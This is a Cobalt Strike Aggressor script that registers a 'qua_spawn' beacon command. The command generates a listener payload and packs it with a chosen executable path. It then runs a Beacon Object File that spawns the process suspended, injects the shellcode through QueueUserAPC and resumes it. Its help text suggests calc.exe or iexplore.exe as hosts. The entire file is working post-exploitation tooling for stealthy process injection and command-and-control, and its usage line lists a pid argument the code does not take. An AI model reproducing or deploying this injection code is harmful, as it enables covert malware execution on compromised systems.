# Chris Sikes
# Apr 2021
# $1 = beacon ID
# $2 = process
# scp * 192.168.122.130:/root/BeaconObjectFile/qua_spawn
# x86_64-w64-mingw32-gcc -c qua_spawn.c -o qua_spawn.x64.o
# i686-w64-mingw32-gcc -c qua_spawn.c -o qua_spawn.x86.o
# x86_64-w64-mingw32-gcc -c qua_spawn.c -o qua_spawn.o


alias qua_spawn {
	local('$bid $handle $data $path $listener $payload $barch');

	# check our arguments
	if (size(@_) != 3) {
		berror($1, "qua_spawn: not enough arguments. Enter the Path to Exe and Listener");
		return;
	}

	# parse our arguments
	$path	= $2;
	$listener = $3;

	# read in our BOF file...
	$barch = barch($1);
	$handle = openf(script_resource("qua_spawn. $+ $barch $+ .o"));
	$data	= readb($handle, -1);
	closef($handle);

	if (listener_info($3) is $null)
	{
		berror($1, "Listener $3 is not found");
	}
	else
	{
    		# Generate a new payload 
    		$payload = payload($3, $barch, "process");
		$handle2 = openf(">out.bin");
		writeb($handle2, $payload);
		closef($handle2);
   
		# pack our arguments
		$args	= bof_pack($1, "zb", $path, $payload);

		# announce to our user..
		btask($1, "Injecting into path $2");

		# run a BOF
		beacon_inline_execute($1, $data, "go", $args);
	}
}
beacon_command_register("qua_spawn", "QueueUserAPC spawn and inject method", "Synopsis: qua_spawn [path] [pid] [listener]\nExample Path (x64): C:\\Windows\\System32\\calc.exe\nExample Path (x86): C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\n\nAsynchronous procedure call to queue a specific thread.\nSpawn, suspend, inject the shellcode, then resume.\nGenerated payload is exitfunc process instead of thread, so the spawned process kills itself on exit.\n\nNote: x86->x86 or x64->x64 spawn only.");

